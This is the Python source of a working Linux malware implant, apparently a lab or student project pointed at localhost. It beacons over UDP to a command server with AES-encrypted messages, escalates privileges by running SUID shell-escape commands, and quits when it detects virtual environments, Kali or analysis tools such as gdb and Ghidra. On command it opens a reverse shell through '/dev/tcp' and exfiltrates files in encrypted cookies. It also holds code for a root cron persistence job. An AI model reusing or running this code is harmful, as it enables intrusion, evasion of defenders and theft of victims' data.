import socket
import base64
import string
import os
import requests
from time import sleep
from random import randint, choice
import sys
from os import system, popen
import psutil
import threading
import subprocess
from subprocess import DEVNULL, STDOUT, check_call, Popen
from crontab import CronTab
from Crypto.Cipher import AES
from Crypto.Random import get_random_bytes
from Crypto.Util.Padding import pad, unpad

AntiDebug = False

NODE_ID = randint(1000, 100000)

IP = "127.0.0.1"
PORT = 53045

BASE_URL = "http://localhost:5000/"

key = bytes.fromhex("926eaa0640299de816d23463ce8ae883")

heartbeat_message = b"heartbeat"



GotExploits = {
      'ash':      '',
      'bash':     '-p',
      'sh':       '-p',
      'dash':     '-p',
      'zsh':      '',
      'busybox':  'sh',
      'docker':   'run -v /:/mnt --rm -it alpine chroot /mnt sh',
      'find':     '. -exec /bin/sh -p \\; -quit',
      'perl':     '-e \'exec "/bin/sh";\'',
      'php':      '-r "pcntl_exec(\'/bin/sh\', [\'-p\']);"',
      'python':   '-c \'import os; os.execl("/bin/sh", "sh", "-p")\'',
      'vim':      '-c \':py import os; os.execl("/bin/sh", "sh", "-pc", "reset; exec sh -p")\'',
  }

default_binaries = [ 'unopk', 'pux', 'JSONStr', 'chrome-sandbox', 'pppd', 'ssh-keysign', \
'dbus-daemon-launch-helper', \
'Xorg.wrap', 'spice-client-glib-usb-acl-helper', 'dmcrypt-get-device', 'polkit-agent-helper-1', \
'snap-confine', 'fusermount', 'umount', 'su', 'sudo', 'pkexec', 'passwd', 'chsh', 'chfn', 'newgrp',\
'mount', 'gpasswd', 'mount', 'ping', 'su', 'umount', 'chfn', 'chsh', 'gpasswd', 'newgrp', 'passwd',\
'sudo', 'dbus-daemon-launch-helper', 'ssh-keysign', 'snap-confine', 'snap-confine', 'chfn', 'chsh',\
'gpasswd', 'mount', 'newgrp', 'passwd', 'su', 'sudo', 'umount', 'dbus-daemon-launch-helper', \
'ssh-keysign', 'chfn', 'chsh', 'gpasswd', 'mount', 'newgrp', 'passwd', 'su', 'sudo', 'umount', \
'dbus-daemon-launch-helper', 'ssh-keysign', 'arping', 'at', 'bwrap']

def build_message(message):
    message_encoded = base64.b64encode(message)
    pre_aes = str(NODE_ID) + "_" + message_encoded.decode()
    plaintext = pre_aes.encode()
    nonce = get_random_bytes(16)
    cipher = AES.new(key, AES.MODE_CBC, nonce)
    ciphertext = cipher.encrypt(pad(plaintext, AES.block_size))
    nonce_encoded = base64.b64encode(nonce).decode()
    ciphertext_encoded = base64.b64encode(ciphertext).decode()
    final_output = nonce_encoded + "_" + ciphertext_encoded
    return final_output.encode()

def deconstruct_message(message):
    nonce_encoded, ciphertext_encoded = message.decode().strip().split("_")
    nonce = base64.b64decode(nonce_encoded)
    ciphertext = base64.b64decode(ciphertext_encoded)
    cipher = AES.new(key, AES.MODE_CBC, nonce)
    plaintext = unpad(cipher.decrypt(ciphertext), AES.block_size)
    return plaintext.decode()

def get_suid_bins():
    cmd = ['find', '/', '-perm', '-4000', '-type', 'f']
    res = subprocess.run(cmd, stdout=subprocess.PIPE, stderr=DEVNULL)

    return res.stdout.decode('unicode_escape').strip().split('\n')

def filter_default(suid_bins):
    custom = []
    for b in suid_bins:
        name = b.split("/")[::-1][0]

        if name not in default_binaries:
            custom.append(b)

    return custom

def exploit_suids(suids):
    exploits = []

    for s in suids:
        name = s.split("/")[::-1][0]

        if name in GotExploits:
            exploit = s + " " + GotExploits[name]
            exploits.append(exploit)

    for exploit in exploits:
        system(exploit)

def privesc():
    suid_bins = get_suid_bins()
    custom_suids = filter_default(suid_bins)
    exploit_suids(custom_suids)

def antidebug():
    global AntiDebug
    black_list_programs = ["binaryninja", "ida", "ghidrarun", "ghidra", "wireshark", "gdb", \
    "valgrind", "objdump", "strings"]

    # Check if we are running in virtual machine, if so, exit
    if (hasattr(sys, 'real_prefix') or (hasattr(sys, 'base_prefix') 
        and sys.base_prefix != sys.prefix)):
        quit()

    # Check if we are running on kali
    output = subprocess.check_output("lsb_release -a", shell=True, stderr=DEVNULL)
    if bytes("Kali", encoding='utf8') in output:
        quit()

    AntiDebug = True

    # Check if blacklisted program is running, and if so, exit
    while True:
        sleep(1)

        for program in black_list_programs:
            for proc in psutil.process_iter():
                if program in proc.name() or program in proc.name().lower():
                    quit()

def setup_persistence():
    cron = CronTab(user='root')
    job = cron.new(command='/opt/malware.bin')
    job.minute.every(60)
    cron.write()

# For testing, the main program will print out the symmetric key in the beginning, 
# paste it below before running


def find_files(directory, extension):
    found_files = []
    for dirpath, dirnames, files in os.walk(os.path.expanduser(directory)):
        for file_name in files:
            if file_name.endswith("." + extension):
                found_files.append(dirpath + "/" + file_name)
    return found_files


def exfil_file(filename):
    with open(filename, 'rb') as f:
        data = f.read()
        name = os.path.basename(f.name)
        url = BASE_URL + ''.join(choice(string.ascii_letters) for _ in range(randint(5, 25)))
        cookie = "b=" + build_message(name.encode()).decode()
        headers = {'User-Agent': 'Mozilla/5.0 (X11; Linix x86_64; rv:99.0) Gecko/20100101 Firefox/99.0',
                   'Connection': 'keep-alive', 'Cookie': cookie}
        requests.get(url=url, headers=headers)
        pieces = [data[x:x+3072] for x in range(0, len(data), 3072)]
        for x in range(0, len(pieces)):
            part = pieces[x]
            url = BASE_URL + ''.join(choice(string.ascii_letters) for _ in range(randint(5, 25)))
            cookie = "b=" + build_message(part).decode()
            if x == len(pieces)-1:
                headers = {'User-Agent': 'Mozilla/5.0 (X11; Linix x86_64; rv:99.0) Gecko/20100101 Firefox/99.0',
                      'Connection': 'close', 'Cookie': cookie}
            else:
                headers = {'User-Agent': 'Mozilla/5.0 (X11; Linix x86_64; rv:99.0) Gecko/20100101 Firefox/99.0',
                           'Connection': 'keep-alive', 'Cookie': cookie}
            requests.get(url=url, headers=headers)


def main():
    global AntiDebug
    
    client_socket = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    client_socket.settimeout(20)
  

    # TODO check if malware is already running, if so quit

    # Start thread to handle anti-debug in the background
    th = threading.Thread(target=antidebug)
    th.start()

    # Make sure anti-debug successfuly completed before continuing execution
    while not AntiDebug:
        pass

    # Privilege escalate to root user
    privesc()

    # Launch cron job that maintains persistence after reboot
    #setup_persistence()

    # print("starting malware")
    
    while True:
        client_socket.sendto(build_message(heartbeat_message), (IP, PORT))
        try:
            recv = client_socket.recvfrom(4096)
        except TimeoutError:
            print("Failed to get a response...")
            continue
        print(recv)
        plaintext = deconstruct_message(recv[0])
        print(plaintext)
        if plaintext.strip() == 'uninstall':
            client_socket.sendto(build_message(b"uninstall ack"), (IP, PORT))
            sleep(1)
            client_socket.close()
            sys.exit(0)
        elif plaintext.strip().startswith("shell"):
            cmd = plaintext.strip().split(" ")
            shell_cmd = "bash -i >& /dev/tcp/" + cmd[1] + "/" + cmd[2] + " 0>&1"
            Popen(shell_cmd, shell=True, stdin=None, stdout=None, stderr=None, close_fds=True)
        elif plaintext.strip().startswith("extract"):
            cmd = plaintext.strip().split(" ")
            file_dir = cmd[1]
            file_extension = cmd[2]
            files = find_files(file_dir, file_extension)
            for file in files:
                exfil_file(file)
        sleep(10)
    
    th.join()

if __name__ == "__main__":
    main()


